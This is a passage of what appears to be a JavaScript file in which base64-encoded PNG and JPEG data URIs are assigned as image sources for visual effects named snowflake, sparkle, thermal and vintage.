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";
    e.snowflake.src =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAYCAYAAACbU/80AAAB5UlEQVRIx8WWiU4CQRBEHQ4ROeRc/v/bCCr3DcppdVKTlJNFuXQ3qTQmkve6Z5gd93DjczweHZ7jtd93F4CyKHnE6iOS4fdTyMH+BdkhG2SLrCG2vVkA4CJKAXmmQI4SGcId4QcKGPTTBJAVsoTI4mIBgA1q8DKr/f0kUzCBtExgLwIG/zA4YvCZVYgsfxWwNUV5QaqEW0oUKMgUMox/dozvfsnMKWAZQ2JyUgDwFME11opIhEuRjRHY6uile4uBx8gIEsNTAgauMxVKVDkRnYROwckG1O5951OCx5Qw+BASo28CgJcJbnACjWASFZlEUTaj3wN+8y2k84l2jgykdiGxcoRbJ02mztoQiZpMoyxLkeVG3FPAj34mXY8EaulzClbfnfzUDNoSkVBGRcpchvBZC1zBCvXpIm9eoB4IREH1Ek1KZH84OrYE9wVu6QXVBPqOP7tIBKJAJArkSmccnHOFEKrgngqkAmBLwK0YufwZAmuFyOde8Lnvl6CV0AS6Se+BTtK/grYXSEu3/3UO2EHUTfIkbENgl9S7oGPHcNzLyAUj/4u34aveC9yJy4hfjnveB6zzHuCbc29EuWDdb7kRDQAeX3snzFPimjuhrf8U8P09bsUpTiDHGncr3vjuw1Gfer4AWKJWgoQmzH8AAAAASUVORK5CYII=";
    e.sparkle.src =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAC7lBMVEUAAAD/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////jtXoAAAA+XRSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9g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";
    e.thermal.src =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAABCAIAAAC+O+cgAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAGZJREFUKFOljAEKwCAMA5My9R/+/4PToZPBwLlVC4MjNOQoIyJAguaUlfDI5lu0P/8Lt0p3099DvW5xRZs+a/M9atB5rWUlDBD7lNRXWQkDguSBoDNfLQJyxdHANPUp2zTtW7ZpSp4yY8IBpvJcNAAAAABJRU5ErkJggg==";
    e.vintage.src =
        "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAwICAgJCAwJCQwRCwoLERUPDAwPFRgTExUTExgXEhQUFBQSFxcbHB4cGxckJCcnJCQ1MzMzNTs7Ozs7Ozs7Ozv/2wBDAQ0LCw0ODRAODhAUDg8OFBQQEREQFB0UFBUUFB0lGhcXFxcaJSAjHh4eIyAoKCUlKCgyMjAyMjs7Ozs7Ozs7Ozv/wgARCAJYAyADASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAECAwf/2gAIAQEAAAAA9SSpKgVmxNZs1N5qUKWWKlkWUSaSaS3Jm0EaslJUrIz0zbJSXNCJRZVWCgWWVEUlSkUgZtWBSwzZozcsdpWbNSJUWWRSi3NWJooIis2iBUpDHSCazuKzYKyZ0qLLLCWKZqarNLGksudWsgJbJNRKolM6lhRZc6yCWSzebKElSaShbjWVs1UkapZArNJYKpCwLLBNZrKzWNE1iihmy50slWVZDUWxjdLCCysy2WWaXJZZFRZZpm3MpGs6zLZZZrNzZLqWXOljOs6ms7M2gJQSW5sqxbCXOoJUsUZsstkQomosgpDSLm3nu2pVllhYikEopAqCLE1LcrNYtY1km5ZZLE3LJZNyyVWs1bnUqWUkoISlEvPaagllzU0ibzrGokaJc6ZCgTUms6UlUKkpJassZqWkmpZLNIlixz6RZqy5ssIsVm5qxbCyVZasoFiWWpYQWVKlgCxLKZqLRirZJvMspChZYJZtQCkKGdZWM6UEssWGc3QpMdMrZcajUQS2Z3nUsssWJa0AsqUlAlSWUSkoublnSwXnrWbYSrLMrLKFSyzUSzRUsaEoACAVBKDNZ1jSUipahYnPoili3NipZZqhDUKAASkpLLJSpLAlgrOOlJrM3M3K42XOhLFBaCalAAAEpLBJoSVLZLLNYTTOrIqWRZoiksKspaZ0SgAAJZQQlWGdQSw